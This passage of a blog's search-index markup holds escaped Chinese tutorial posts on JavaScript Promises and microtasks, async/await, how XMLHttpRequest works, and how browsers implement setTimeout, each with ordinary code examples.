&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629358262605.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;h2 id=&#34;promise与微任务&#34;&gt;Promise与微任务&lt;/h2&gt;
&lt;p&gt;由于Promise采⽤了回调函数延迟绑定技术，所以在执⾏resolve函数的时候，回 调函数还没有绑定，那么只能推迟回调函数的执⾏。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function Bromise(executor) {
	var onResolve_ = null
	var onReject_ = null
	//模拟实现resolve和then，暂不⽀持rejcet
	this.then = function (onResolve, onReject) {
	onResolve_ = onResolve
};
	function resolve(value) {
		setTimeout(()=&amp;gt;{
			onResolve_(value)
	 	},0)
}
	executor(resolve, null);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上⾯采⽤了定时器来推迟onResolve的执⾏，不过使⽤定时器的效率并不是太⾼，，所以 Promise⼜把这个定时器改造成了微任务了，这样既可以让onResolve_延时被调⽤，⼜提升了代码的执⾏ 效率。这就是Promise中使⽤微任务的原由了。&lt;/p&gt;
">使⽤Promise，告别回调函数</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/async-han-shu/"" data-c="
          &lt;p&gt;async 函数就是 Generator 函数的语法糖&lt;/p&gt;
&lt;p&gt;&lt;code&gt;async&lt;/code&gt;函数就是将 Generator 函数的星号（&lt;code&gt;*&lt;/code&gt;）替换成&lt;code&gt;async&lt;/code&gt;，将&lt;code&gt;yield&lt;/code&gt;替换成&lt;code&gt;await&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;async&lt;/code&gt;函数对 Generator 函数的改进，体现在以下四点&lt;/p&gt;
&lt;p&gt;（1）内置执行器。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;async&lt;/code&gt;函数的执行，与普通函数一模一样，只要一行。不像 Generator 函数，需要调用&lt;code&gt;next&lt;/code&gt;方法，或者用&lt;code&gt;co&lt;/code&gt;模块，才能真正执行&lt;/p&gt;
&lt;p&gt;（2）更好的语义。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;async&lt;/code&gt;和&lt;code&gt;await&lt;/code&gt;，比起星号和&lt;code&gt;yield&lt;/code&gt;，语义更清楚了。&lt;code&gt;async&lt;/code&gt;表示函数里有异步操作，&lt;code&gt;await&lt;/code&gt;表示紧跟在后面的表达式需要等待结果。&lt;/p&gt;
&lt;p&gt;（3）更广的适用性。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;co&lt;/code&gt;模块约定，&lt;code&gt;yield&lt;/code&gt;命令后面只能是 Thunk 函数或 Promise 对象，而&lt;code&gt;async&lt;/code&gt;函数的&lt;code&gt;await&lt;/code&gt;命令后面，可以是 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时会自动转成立即 resolved 的 Promise 对象）。&lt;/p&gt;
&lt;p&gt;（4）返回值是 Promise。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;async&lt;/code&gt;函数的返回值是 Promise 对象，这比 Generator 函数的返回值是 Iterator 对象方便多了。你可以用&lt;code&gt;then&lt;/code&gt;方法指定下一步的操作。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;async&lt;/code&gt;函数完全可以看作多个异步操作，包装成的一个 Promise 对象，而&lt;code&gt;await&lt;/code&gt;命令就是内部&lt;code&gt;then&lt;/code&gt;命令的语法糖。&lt;/p&gt;
&lt;h2 id=&#34;基本用法&#34;&gt;基本用法&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;async&lt;/code&gt;函数返回一个 Promise 对象，可以使用&lt;code&gt;then&lt;/code&gt;方法添加回调函数。当函数执行的时候，一旦遇到&lt;code&gt;await&lt;/code&gt;就会先返回，等到异步操作完成，再接着执行函数体内后面的语句。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function getStockPriceByName(name) {
  const symbol = await getStockSymbol(name);
  const stockPrice = await getStockPrice(symbol);
  return stockPrice;
}

getStockPriceByName(&#39;goog&#39;).then(function (result) {
  console.log(result);
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;函数前面的&lt;code&gt;async&lt;/code&gt;关键字，表明该函数内部有异步操作。调用该函数时，会立即返回一个&lt;code&gt;Promise&lt;/code&gt;对象。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;语法&#34;&gt;语法&lt;/h2&gt;
&lt;h3 id=&#34;返回-promise-对象&#34;&gt;返回 Promise 对象&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;async&lt;/code&gt;函数返回一个 Promise 对象。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;async&lt;/code&gt;函数内部&lt;code&gt;return&lt;/code&gt;语句返回的值，会成为&lt;code&gt;then&lt;/code&gt;方法回调函数的参数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function f() {
  return &#39;hello world&#39;;
}

f().then(v =&amp;gt; console.log(v))
// &amp;quot;hello world&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;函数&lt;code&gt;f&lt;/code&gt;内部&lt;code&gt;return&lt;/code&gt;命令返回的值，会被&lt;code&gt;then&lt;/code&gt;方法回调函数接收到。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;async&lt;/code&gt;函数内部抛出错误，会导致返回的 Promise 对象变为&lt;code&gt;reject&lt;/code&gt;状态。抛出的错误对象会被&lt;code&gt;catch&lt;/code&gt;方法回调函数接收到。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function f() {
  throw new Error(&#39;出错了&#39;);
}

f().then(
  v =&amp;gt; console.log(&#39;resolve&#39;, v),
  e =&amp;gt; console.log(&#39;reject&#39;, e)
)
//reject Error: 出错了
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;promise-对象的状态变化&#34;&gt;Promise 对象的状态变化&lt;/h3&gt;
&lt;p&gt;只有&lt;code&gt;async&lt;/code&gt;函数内部的异步操作执行完，才会执行&lt;code&gt;then&lt;/code&gt;方法指定的回调函数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function getTitle(url) {
  let response = await fetch(url);
  let html = await response.text();
  return html.match(/&amp;lt;title&amp;gt;([\s\S]+)&amp;lt;\/title&amp;gt;/i)[1];
}
getTitle(&#39;https://tc39.github.io/ecma262/&#39;).then(console.log)
// &amp;quot;ECMAScript 2017 Language Specification&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;函数&lt;code&gt;getTitle&lt;/code&gt;内部有三个操作：抓取网页、取出文本、匹配页面标题。只有这三个操作全部完成，才会执行&lt;code&gt;then&lt;/code&gt;方法里面的&lt;code&gt;console.log&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&#34;await-命令&#34;&gt;await 命令&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;await&lt;/code&gt;命令后面是一个应该是一个 Promise 对象，返回该对象的结果。如果不是 Promise 对象，就直接返回对应的值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function f() {
  // 等同于
  // return 123;
  return await 123;
}

f().then(v =&amp;gt; console.log(v))
// 123
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，&lt;code&gt;await&lt;/code&gt;命令的参数是数值&lt;code&gt;123&lt;/code&gt;，这时等同于&lt;code&gt;return 123&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;另一种情况是，&lt;code&gt;await&lt;/code&gt;命令后面是一个&lt;code&gt;thenable&lt;/code&gt;对象（即定义了&lt;code&gt;then&lt;/code&gt;方法的对象），那么&lt;code&gt;await&lt;/code&gt;会将其等同于 Promise 对象。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;class Sleep {
  constructor(timeout) {
    this.timeout = timeout;
  }
  then(resolve, reject) {
    const startTime = Date.now();
    setTimeout(
      () =&amp;gt; resolve(Date.now() - startTime),
      this.timeout
    );
  }
}

(async () =&amp;gt; {
  const sleepTime = await new Sleep(1000);
  console.log(sleepTime);
})();
// 1000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;await&lt;/code&gt;命令后面是一个&lt;code&gt;Sleep&lt;/code&gt;对象的实例。这个实例不是 Promise 对象，但是因为定义了&lt;code&gt;then&lt;/code&gt;方法，&lt;code&gt;await&lt;/code&gt;会将其视为&lt;code&gt;Promise&lt;/code&gt;处理。&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;&lt;code&gt;await&lt;/code&gt;命令后面的 Promise 对象如果变为&lt;code&gt;reject&lt;/code&gt;状态，则&lt;code&gt;reject&lt;/code&gt;的参数会被&lt;code&gt;catch&lt;/code&gt;方法的回调函数接收到&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function f() {
  await Promise.reject(&#39;出错了&#39;);
}

f()
.then(v =&amp;gt; console.log(v))
.catch(e =&amp;gt; console.log(e))
// 出错了
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;任何一个&lt;code&gt;await&lt;/code&gt;语句后面的 Promise 对象变为&lt;code&gt;reject&lt;/code&gt;状态，那么整个&lt;code&gt;async&lt;/code&gt;函数都会中断执行。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function f() {
  await Promise.reject(&#39;出错了&#39;);
  await Promise.resolve(&#39;hello world&#39;); // 不会执行
}
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;p&gt;有时，我们希望即使前一个异步操作失败，也不要中断后面的异步操作。这时可以将第一个&lt;code&gt;await&lt;/code&gt;放在&lt;code&gt;try...catch&lt;/code&gt;结构里面，这样不管这个异步操作是否成功，第二个&lt;code&gt;await&lt;/code&gt;都会执行。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function f() {
  try {
    await Promise.reject(&#39;出错了&#39;);
  } catch(e) {
  }
  return await Promise.resolve(&#39;hello world&#39;);
}

f()
.then(v =&amp;gt; console.log(v))
// hello world
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另一种方法是&lt;code&gt;await&lt;/code&gt;后面的 Promise 对象再跟一个&lt;code&gt;catch&lt;/code&gt;方法，处理前面可能出现的错误。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function f() {
  await Promise.reject(&#39;出错了&#39;)
    .catch(e =&amp;gt; console.log(e));
  return await Promise.resolve(&#39;hello world&#39;);
}

f()
.then(v =&amp;gt; console.log(v))
// 出错了
// hello world
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;错误处理&#34;&gt;错误处理&lt;/h3&gt;
&lt;p&gt;如果&lt;code&gt;await&lt;/code&gt;后面的异步操作出错，那么等同于&lt;code&gt;async&lt;/code&gt;函数返回的 Promise 对象被&lt;code&gt;reject&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function f() {
  await new Promise(function (resolve, reject) {
    throw new Error(&#39;出错了&#39;);
  });
}

f()
.then(v =&amp;gt; console.log(v))
.catch(e =&amp;gt; console.log(e))
// Error：出错了
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;防止出错的方法，也是将其放在&lt;code&gt;try...catch&lt;/code&gt;代码块之中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function f() {
  try {
    await new Promise(function (resolve, reject) {
      throw new Error(&#39;出错了&#39;);
    });
  } catch(e) {
  }
  return await(&#39;hello world&#39;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;使用注意点&#34;&gt;使用注意点&lt;/h3&gt;
&lt;p&gt;第一点，&lt;code&gt;await&lt;/code&gt;命令后面的&lt;code&gt;Promise&lt;/code&gt;对象，运行结果可能是&lt;code&gt;rejected&lt;/code&gt;，所以最好把&lt;code&gt;await&lt;/code&gt;命令放在&lt;code&gt;try...catch&lt;/code&gt;代码块中。&lt;/p&gt;
&lt;p&gt;第二点，多个&lt;code&gt;await&lt;/code&gt;命令后面的异步操作，如果不存在继发关系，最好让它们同时触发。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;let foo = await getFoo();
let bar = await getBar();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;etFoo&lt;/code&gt;和&lt;code&gt;getBar&lt;/code&gt;是两个独立的异步操作（即互不依赖），被写成继发关系。这样比较耗时，因为只有&lt;code&gt;getFoo&lt;/code&gt;完成以后，才会执行&lt;code&gt;getBar&lt;/code&gt;，完全可以让它们同时触发。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// 写法一
let [foo, bar] = await Promise.all([getFoo(), getBar()]);
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;// 写法二
let fooPromise = getFoo();
let barPromise = getBar();
let foo = await fooPromise;
let bar = await barPromise;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;第三点，&lt;code&gt;await&lt;/code&gt;命令只能用在&lt;code&gt;async&lt;/code&gt;函数之中，如果用在普通函数，就会报错&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function dbFuc(db) {
  let docs = [{}, {}, {}];

  // 报错
  docs.forEach(function (doc) {
    await db.post(doc);
  });
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果将&lt;code&gt;forEach&lt;/code&gt;方法的参数改成&lt;code&gt;async&lt;/code&gt;函数，也有问题。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function dbFuc(db) { //这里不需要 async
  let docs = [{}, {}, {}];

  // 可能得到错误结果
  docs.forEach(async function (doc) {
    await db.post(doc);
  });
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码可能不会正常工作，原因是这时三个&lt;code&gt;db.post()&lt;/code&gt;操作将是并发执行，也就是同时执行，而不是继发执行。正确的写法是采用&lt;code&gt;for&lt;/code&gt;循环。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function dbFuc(db) {
  let docs = [{}, {}, {}];

  for (let doc of docs) {
    await db.post(doc);
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;另一种方法是使用数组的&lt;code&gt;reduce()&lt;/code&gt;方法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function dbFuc(db) {
  let docs = [{}, {}, {}];

  await docs.reduce(async (_, doc) =&amp;gt; {
    await _;
    await db.post(doc);
  }, undefined);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;reduce()&lt;/code&gt;方法的第一个参数是&lt;code&gt;async&lt;/code&gt;函数，导致该函数的第一个参数是前一步操作返回的 Promise 对象，所以必须使用&lt;code&gt;await&lt;/code&gt;等待它操作结束。&lt;/p&gt;
&lt;p&gt;如果确实希望多个请求并发执行，可以使用&lt;code&gt;Promise.all&lt;/code&gt;方法&lt;/p&gt;
&lt;p&gt;第四点，async 函数可以保留运行堆栈&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const a = () =&amp;gt; {
  b().then(() =&amp;gt; c());
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;函数&lt;code&gt;a&lt;/code&gt;内部运行了一个异步任务&lt;code&gt;b()&lt;/code&gt;。当&lt;code&gt;b()&lt;/code&gt;运行的时候，函数&lt;code&gt;a()&lt;/code&gt;不会中断，而是继续执行。等到&lt;code&gt;b()&lt;/code&gt;运行结束，可能&lt;code&gt;a()&lt;/code&gt;早就运行结束了，&lt;code&gt;b()&lt;/code&gt;所在的上下文环境已经消失了。如果&lt;code&gt;b()&lt;/code&gt;或&lt;code&gt;c()&lt;/code&gt;报错，错误堆栈将不包括&lt;code&gt;a()&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;将这个例子改成&lt;code&gt;async&lt;/code&gt;函数&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;const a = async () =&amp;gt; {
  await b();
  c();
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;b()&lt;/code&gt;运行的时候，&lt;code&gt;a()&lt;/code&gt;是暂停执行，上下文环境都保存着。一旦&lt;code&gt;b()&lt;/code&gt;或&lt;code&gt;c()&lt;/code&gt;报错，错误堆栈将包括&lt;code&gt;a()&lt;/code&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;async-函数的实现原理&#34;&gt;async 函数的实现原理&lt;/h2&gt;
&lt;p&gt;async 函数的实现原理，就是将 Generator 函数和自动执行器，包装在一个函数里。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function fn(args) {
  // ...
}

// 等同于

function fn(args) {
  return spawn(function* () {
    // ...
  });
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所有的&lt;code&gt;async&lt;/code&gt;函数都可以写成上面的第二种形式，&lt;code&gt;spawn&lt;/code&gt;函数就是自动执行器&lt;/p&gt;
&lt;p&gt;&lt;code&gt;spawn&lt;/code&gt;函数的实现&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function spawn(genF) {
  return new Promise(function(resolve, reject) {
    const gen = genF();
    function step(nextF) {
      let next;
      try {
        next = nextF();
      } catch(e) {
        return reject(e);
      }
      if(next.done) {
        return resolve(next.value);
      }
      Promise.resolve(next.value).then(function(v) {
        step(function() { return gen.next(v); });
      }, function(e) {
        step(function() { return gen.throw(e); });
      });
    }
    step(function() { return gen.next(undefined); });
  });
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;实例按顺序完成异步操作&#34;&gt;实例：按顺序完成异步操作&lt;/h2&gt;
&lt;p&gt;实际开发中，经常遇到一组异步操作，需要按照顺序完成。比如，依次远程读取一组 URL，然后按照读取的顺序输出结果。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;function logInOrder(urls) {
  // 远程读取所有URL
  const textPromises = urls.map(url =&amp;gt; {
    return fetch(url).then(response =&amp;gt; response.text());
  });

  // 按次序输出
  textPromises.reduce((chain, textPromise) =&amp;gt; {
    return chain.then(() =&amp;gt; textPromise)
      .then(text =&amp;gt; console.log(text));
  }, Promise.resolve());
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码使用&lt;code&gt;fetch&lt;/code&gt;方法，同时远程读取一组 URL。每个&lt;code&gt;fetch&lt;/code&gt;操作都返回一个 Promise 对象，放入&lt;code&gt;textPromises&lt;/code&gt;数组。然后，&lt;code&gt;reduce&lt;/code&gt;方法依次处理每个 Promise 对象，然后使用&lt;code&gt;then&lt;/code&gt;，将所有 Promise 对象连起来，因此就可以依次输出结果。&lt;/p&gt;
&lt;p&gt;async 函数实现。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;async function logInOrder(urls) {
  for (const url of urls) {
    const response = await fetch(url);
    console.log(await response.text());
  }
}
&lt;/code&gt;&lt;/pre&gt;
">async 函数</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/xmlhttprequest-shi-zen-me-shi-xian-de/"" data-c="
          &lt;h2 id=&#34;介绍&#34;&gt;介绍&lt;/h2&gt;
&lt;p&gt;在XMLHttpRequest出现之前，如果服务器数据有更新，依然需要重新刷新整个⻚⾯。⽽ XMLHttpRequest提供了从Web服务器获取数据的能⼒，如果你想要更新某条数据，只需要通过 XMLHttpRequest请求服务器提供的接⼝，就可以获取到服务器的数据，然后再操作DOM来更新⻚⾯内容， 整个过程只需要更新⽹⻚的⼀部分就可以了，⽽不⽤像之前那样还得刷新整个⻚⾯，这样既有效率⼜不会打 扰到⽤⼾。&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;回调函数-vs-系统调用栈&#34;&gt;回调函数 VS 系统调⽤栈&lt;/h2&gt;
&lt;p&gt;将⼀个函数作为参数传递给另外⼀个函数，那作为参数的这个函数就是&lt;strong&gt;回调函数&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let callback = function(){
console.log(&#39;i am do homework&#39;)
}

function doWork(cb) {
console.log(&#39;start do work&#39;)
cb()
console.log(&#39;end do work&#39;)
}

doWork(callback)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将⼀个匿名函数赋值给变量callback，同时将callback作为参数传递给了doWork() 函数，这时在函数&lt;strong&gt;doWork()&lt;strong&gt;中callback就是&lt;/strong&gt;回调函数&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;⾯的回调⽅法有个特点，就是回调函数callback是在主函数doWork返回之前执⾏的，我们把这个回调过 程称为&lt;strong&gt;同步回调&lt;/strong&gt;。&lt;/p&gt;
&lt;br&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let callback = function(){
console.log(&#39;i am do homework&#39;)
}

function doWork(cb) {
console.log(&#39;start do work&#39;)
setTimeout(cb,0)
console.log(&#39;end do work&#39;)
}

doWork(callback)

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使⽤了setTimeout函数让callback在doWork函数执⾏结束后执行，这次callback并没有在主函数doWork内部被调⽤，我们把这种回调函数在主函数外部执⾏的过程称为&lt;strong&gt;异步 回调&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;异步回调是指回调函数在主函数之外执⾏，⼀般有两 种⽅式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第⼀种是把异步函数做成⼀个任务，添加到信息队列尾部；&lt;/li&gt;
&lt;li&gt;第⼀种是把异步函数做成⼀个任务，添加到信息队列尾部；&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h2 id=&#34;xmlhttprequest运作机制&#34;&gt;XMLHttpRequest运作机制&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;  function GetWebData(URL) {
      /**
      * 1:新建XMLHttpRequest请求对象
      */
      let xhr = new XMLHttpRequest()
      /**
      * 2:注册相关事件回调处理函数
      */
      xhr.onreadystatechange = function () {
        switch (xhr.readyState) {
          case 0: //请求未初始化
            console.log(&amp;quot;请求未初始化&amp;quot;)
            break;
          case 1://OPENED
            console.log(&amp;quot;OPENED&amp;quot;)
            break;
          case 2://HEADERS_RECEIVED
            console.log(&amp;quot;HEADERS_RECEIVED&amp;quot;)
            break;
          case 3://LOADING
            console.log(&amp;quot;LOADING&amp;quot;)
            break;
          case 4://DONE
            if (this.status == 200 || this.status == 304) {
              console.log(this.responseText);
            }
            console.log(&amp;quot;DONE&amp;quot;)
            break;
        }
      }
      xhr.ontimeout = function (e) { console.log(&#39;ontimeout&#39;) }
      xhr.onerror = function (e) { console.log(&#39;onerror&#39;) }
      /**
      * 3:打开请求
      */
      xhr.open(&#39;Get&#39;, URL, true);//创建⼀个Get请求,采⽤异步
      /**
      * 4:配置参数
      */
      xhr.timeout = 3000 //设置xhr请求的超时时间
      xhr.responseType = &amp;quot;text&amp;quot; //设置响应返回的数据格式
      xhr.setRequestHeader(&amp;quot;X_TEST&amp;quot;, &amp;quot;time.geekbang&amp;quot;)
      /**
      * 5:发送请求
      */
      xhr.send();
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;第一步创建xmlhttprequest对象&#34;&gt;第⼀步：创建XMLHttpRequest对象。&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;let xhr = new XMLHttpRequest()&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;第二步为xhr对象注册回调函数&#34;&gt;第⼆步：为xhr对象注册回调函数。&lt;/h3&gt;
&lt;p&gt;因为⽹络请求⽐较耗时，所以要注册回调函数，这样后台任务执⾏完成之后就会通过调⽤回调函数来告诉其 执⾏结果。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;XMLHttpRequest&lt;/code&gt;的回调函数主要有下⾯⼏种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ontimeout，⽤来监控超时请求，如果后台请求超时了，该函数会被调⽤；&lt;/li&gt;
&lt;li&gt;onerror，⽤来监控出错信息，如果后台请求出错了，该函数会被调⽤；&lt;/li&gt;
&lt;li&gt;onreadystatechange，⽤来监控后台请求过程中的状态，⽐如可以监控到HTTP头加载完成的消息、 HTTP响应体消息以及数据加载完成的消息等。&lt;/li&gt;
&lt;/ul&gt;
&lt;br&gt;
&lt;h3 id=&#34;第三步配置基础的请求信息&#34;&gt;第三步：配置基础的请求信息。&lt;/h3&gt;
&lt;p&gt;通过open接⼝配置⼀些基础的请求信 息，包括请求的地址、请求⽅法（是get还是post）和请求⽅式（同步还是异步请求）。&lt;/p&gt;
&lt;p&gt;还可以通过xhr.responseType = &amp;quot;text&amp;quot;来配置服务器返回的格式&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629187727468.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;可以通过&lt;code&gt;xhr.setRequestHeader&lt;/code&gt;来添加⾃⼰专⽤的请求头属性&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;第四步发起请求&#34;&gt;第四步：发起请求。&lt;/h3&gt;
&lt;p&gt;⼀切准备就绪之后，就可以调⽤&lt;code&gt;xhr.send&lt;/code&gt;来发起⽹络请求了&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;xmlhttprequest注意点&#34;&gt;XMLHttpRequest注意点&lt;/h2&gt;
&lt;p&gt;1.跨域问题&lt;/p&gt;
&lt;p&gt;不是同⼀个源的情况下就涉及到了跨域 （在A站点中去访问不同源的B站点的内容）。默认情况下，跨域请求是不被允许的&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;2.HTTPS混合内容的问题&lt;/p&gt;
&lt;p&gt;HTTPS混合内容是HTTPS⻚⾯中包含了不符合 HTTPS安全要求的内容，⽐如包含了HTTP资源，通过HTTP加载的图像、视频、样式表、脚本等，都属于 混合内容。&lt;/p&gt;
&lt;p&gt;如果HTTPS请求⻚⾯中使⽤混合内容，浏览器会针对HTTPS混合内容显⽰警告，⽤来向⽤⼾表明此 HTTPS⻚⾯包含不安全的资源。⽐如打开站点 https://www.iteye.com/groups ，可以通过控制台看到混合 内容的警告，参考下图：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1629187721971.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">XMLHttpRequest是怎么实现的？</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/settimeout-shi-ru-he-shi-xian-de/"" data-c="
          &lt;h2 id=&#34;介绍&#34;&gt;介绍&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;setTimeout&lt;/code&gt;它就是 ⼀个定时器，⽤来指定某个函数在多少毫秒之后执⾏&lt;/p&gt;
&lt;p&gt;它会返回⼀个整数，表⽰定时器的编号，同时你还可 以通过该编号来取消这个定时器。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;function showName(){
console.log(&amp;quot;极客时间&amp;quot;)
}
var timerID = setTimeout(showName,200);

&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;h2 id=&#34;浏览器怎么实现settimeout&#34;&gt;浏览器怎么实现setTimeout&lt;/h2&gt;
&lt;p&gt;我们知道渲染进程中所有运⾏在主线程 上的任务都需要先添加到消息队列，我们知道渲染进程中所有运⾏在主线程 上的任务都需要先添加到消息队列，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当接收到HTML⽂档数据，渲染引擎就会将“解析DOM”事件添加到消息队列中&lt;/li&gt;
&lt;li&gt;当⽤⼾改变了Web⻚⾯的窗⼝⼤⼩，渲染引擎就会将“重新布局”的事件添加到消息队列中。&lt;/li&gt;
&lt;li&gt;当触发了JavaScript引擎垃圾回收机制，渲染引擎会将“垃圾回收”任务添加到消息队列中。&lt;/li&gt;
&lt;li&gt;同样，如果要执⾏⼀段异步JavaScript代码，也是需要将执⾏任务添加到消息队列中。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在Chrome中除了正常使⽤的消息队列之外，还有另外⼀个消息队列，这个队列中&lt;strong&gt;维护了需要延迟执⾏的任务列表&lt;/strong&gt;，包括了定时器和Chromium内部⼀些需要延迟执⾏的任务。所以当通过JavaScript创建⼀个定时器 时，&lt;strong&gt;渲染进程会将该定时器的回调任务添加到延迟队列中&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;当通过JavaScript调⽤setTimeout设置回调函数的时候，渲染进程将会创建⼀个&lt;strong&gt;回调任务&lt;/strong&gt;，包含了回调函 数showName、当前发起时间、延迟执⾏时间&lt;/p&gt;
&lt;p&gt;创建好回调任务之后，再将该任务添加到延迟执⾏队列中&lt;/p&gt;
&lt;p&gt;浏览器会根据发起时间和延迟时间计算出到期的任务，然后依次 执⾏这些到期的任务&lt;/p&gt;
&lt;br&gt;
